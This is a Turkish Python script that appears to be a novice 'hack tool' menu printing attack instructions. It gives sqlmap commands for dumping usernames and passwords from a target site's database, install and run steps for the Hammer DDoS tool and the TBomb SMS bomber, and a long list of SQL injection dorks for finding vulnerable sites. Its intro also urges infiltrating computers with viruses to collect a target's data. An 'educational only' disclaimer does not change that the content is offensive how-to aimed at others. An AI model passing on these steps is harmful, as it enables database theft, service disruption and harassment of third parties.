islem = int(input(("""
1= Hack Bilgileri
2= Hack Araçları Kullanımı
3= Hakkımızda


 NOT: Bilgiler Sadece Eğitim Amaçlıdır Herhangi Bir Sorumluluk Kabul Etmiyorum.

İşlem Giriniz: """)))



if islem ==1: 
    print("Hack Bilgilerine Hoşgeldiniz.")
    print("""
        Site Açıkları XXS,BYPASS,SQL, EN YAYGIN OLARAK BİLİNEN AÇIKLARDIR.
        Sosyal Mühendislik İle Birlikte Daha Fazla İş Gören Açık Türleri Az Bilinir
        Backdoor,Trojen,Casus Ve Fidye Yazılımları da İşe Yaramaktadır
        Ana Bilgisayara Virüsler Sayesinde Sızıp Hedef Kişiden Verileri Toplayabilirsiniz.
             """)
    exit()


elif islem == 3:
    print("---HAKKIMIZDA---")
    print("""
        Merhaba, Hoşgeldiniz Umarım Toolumuzu Beğenmişsinizdir.
        Henüz Yapım Halinde Olduğundan Eksiklikler Görebilirsiniz.
        Sormak İstediğiniz Soruları İnstagram Üzerinden İletebilirsiniz.
        İyi Günler Dilerim. @ozekk35 , @bytegn @crexplorer_ #ByTegn
    """)
    exit()
elif islem == 2: 
        print("Hack Toollarına Hoşgeldiniz")
        print("""
        1- SQLMAP
        2- HAMMER
        3- DORKLAR
        4- MD5 Kırıcı
        5- Sms Bomber
        
        """)
arac  = int(input("Lütfen Bir Seçenek Giriniz: "))
if arac == 1:
    print("""
 -----------SQLMAP KULLANIMI----------



Öncelikle Terminalimizi Açıyoruz

& apt update
& pkg install git
& pkg install python
& pkg install python2
& git clone https://github.com/sqlmapproject/sqlmap.git 
& ls 
& cd sqlmap

-- Y/n Gibi Şeyler Çıkarsa Y Yazın Yada Enter a Basın --

Daha SONRA 


python2 sqlmap.py -u https://hedefsite.com/index.php?id=5 --dbs



---- SQL AÇIĞI VAR İSE SONUÇLARI GÖSTERİR ----



Eğer Açık Var İse

python2 sqlmap.py https://hedefsite.com/index.php?id=5 -D "tablo  ismi" --tables

> Tablo İsimlerini Gösterir

python2 sqlmap.py https://hedefsite.com/index.php?id=5 -D "Tablo İsmi" -T "tablo" --columns

> Tablodaki Kolonları Getirir

python2 sqlmap.py https://hedefsite.com/index.php?id=5 -D "tablo ismi" -T "tablo" -C "Girilecek Kolon Adı" --dump

> Kolonlara Girerek Kullanıcı Adı ve Şifreyi verir.




    """)

    print("@ozekk35 ByTegn.")

elif arac == 2:   
    print("""
    

    Hammer ( DDOS Nedir? )

    Çoklu sistemlerde hedef sistemin kaynakları ya da bant genişliğinin 
    istila edilerek hizmet veremeyecek duruma getirilmesine verilen isimdir.
    


    ------KURULUM---------


    & apt update
    & pkg install git
    & pkg install python
    & pkg install python2
    & git clone https://github.com/Pavithran-R/Hammer/
    & cd Hammer
    & python hammer.py -s [ip Address] -t 135


    Sitenin İP Adresini Öğrenmek İçin Site Sorgulama Sitelerine Bakabilirsiniz.

    @ozekk35 #ByExplorer
    """)

elif arac == 3:
    print("""
    --- SQL DORKLARI ---


gnu/?doc=
zb/view.php?uid=
global/product/product.php?gubun=
m_view.php?ps_db=
naboard/memo.php?bd=
bookmark/mybook/bookmark.php?bookPageNo=
board/board.html?table=
kboard/kboard.php?board=
order.asp?lotid=
english/board/view****.php?code=
goboard/front/board_view.php?code=
bbs/bbsView.php?id=
boardView.php?bbs=
eng/rgboard/view.php?&bbs_id=
product/product.php?cate=
content.php?p=
page.php?module=
?pid=
bookpage.php?id=
view_items.php?id=
index.php?pagina=
product.php?prodid=
notify/notify_form.php?topic_id=
php/index.php?id=
content.php?cid=
product.php?product_id=
constructies/product.php?id=
detail.php?id=
php/index.php?id=
index.php?section=
product.php?****=
show_bug.cgi?id=
detail.php?id=
bookpage.php?id=
product.php?id=
today.php?eventid=
main.php?item=
index.php?cPath=
news.php?id=
event.php?id=
print.php?sid=
news/news.php?id=
module/range/dutch_windmill_collection.php?rangeId=
print.php?sid=
show_bug.cgi?id=
product_details.php?product_id=
products.php?groupid=
projdetails.php?id=
product.php?productid=
products.php?catid=
product.php?product_id=
product.php?prodid=
product.php?prodid=
newsitem.php?newsID=
newsitem.php?newsid=
profile.php?id=
********s_in_area.php?area_id=
productlist.php?id=
productsview.php?proid=
rss.php?cat=
pub/pds/pds_view.php?start=
products.php?rub=
ogloszenia/rss.php?cat=
print.php?sid=
product.php?id=
print.php?sid=
magazin.php?cid=
galerie.php?cid=
www/index.php?page=
view.php?id=
content.php?id=
board/read.php?tid=
product.php?id_h=
news.php?id=
index.php?book=

@ozekk35 #Explorer
    """)  

elif arac == 4:
    
        print("---YAKINDA EKLENECEKTİR---")
        
elif arac == 5:
        print("""
        
    & apt update
    & pkg install git
    & pkg install python
    & pkg install python2
    & git clone https://github.com/TheSpeedX/TBomb.git
    & cd TBomb
    & chmod +x TBomb.sh
    & ./TBomb.sh
    &  Y/n Çıkarsa Hepsine Y Diyiniz.
        """)




else:   
    print("Geçersiz İşlem...")
